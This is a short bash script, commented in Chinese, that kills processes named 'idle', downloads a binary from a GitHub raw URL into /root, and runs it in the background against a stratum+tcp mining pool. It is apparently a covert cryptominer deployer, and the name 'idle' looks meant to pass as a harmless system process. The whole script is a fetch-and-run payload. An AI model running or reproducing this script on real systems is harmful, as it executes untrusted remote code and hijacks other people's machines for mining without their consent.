#!/bin/bash

# 杀掉所有idle进程
pkill -f idle

sleep 5

# 切换到root目录（确认当前用户有权限）
cd /root || exit 1

# 下载idle文件
wget https://raw.githubusercontent.com/zjaacmyx/xxx1/main/idle -O idle

sleep 5

# 赋予执行权限
chmod +x idle

# 后台运行idle，日志写到idle.log
nohup ./idle --url=stratum+tcp://xxx3.zjlcc.eu.org:7777 --user=worker_name --pass=x > idle.log 2>&1 &
